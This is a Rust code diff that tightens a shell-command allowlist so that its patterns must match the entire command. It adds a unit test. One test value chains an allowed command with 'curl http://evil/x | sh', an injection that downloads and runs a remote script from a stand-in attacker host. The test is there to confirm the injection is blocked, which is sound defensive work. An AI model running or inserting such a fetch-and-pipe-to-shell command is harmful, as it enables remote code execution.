@@ -2786,7 +2786,7 @@ impl RemoteInvokeExecutor {
                 let allowed = policy
                     .allowed_shell_patterns
                     .iter()
-                    .any(|pattern| Regex::new(pattern).is_ok_and(|re| re.is_match(shell_text)));
+                    .any(|pattern| shell_text_matches_allow_pattern(pattern, shell_text));
                 if !allowed {
                     return Err(BifrostError::Config(format!(
                         "shell_text does not match any allowlist rule in policy '{}'",
@@ -3262,6 +3262,13 @@ fn dedupe_shell_exec_modes(modes: &mut Vec<ShellExecMode>) {
         }
     }
     *modes = deduped;
+}
+
+fn shell_text_matches_allow_pattern(pattern: &str, shell_text: &str) -> bool {
+    Regex::new(pattern).is_ok_and(|re| {
+        re.find(shell_text)
+            .is_some_and(|m| m.start() == 0 && m.end() == shell_text.len())
+    })
 }
 
 #[cfg(test)]
@@ -4771,6 +4778,22 @@ mod tests {
         let (prog, args) = build_shell_text_argv(Some("/bin/bash"), "echo hi", true);
         assert_eq!(prog, "/bin/bash");
         assert_eq!(args, vec!["-lc".to_string(), "echo hi".to_string()]);
+    }
+
+    #[test]
+    fn shell_text_allow_pattern_requires_full_match() {
+        assert!(shell_text_matches_allow_pattern(
+            r"^bifrost\s+status$",
+            "bifrost status"
+        ));
+        assert!(!shell_text_matches_allow_pattern(
+            r"^bifrost\s+",
+            "bifrost status; curl http://evil/x | sh"
+        ));
+        assert!(!shell_text_matches_allow_pattern(
+            r"bifrost",
+            "echo bifrost"
+        ));
     }
 
     #[cfg(windows)]
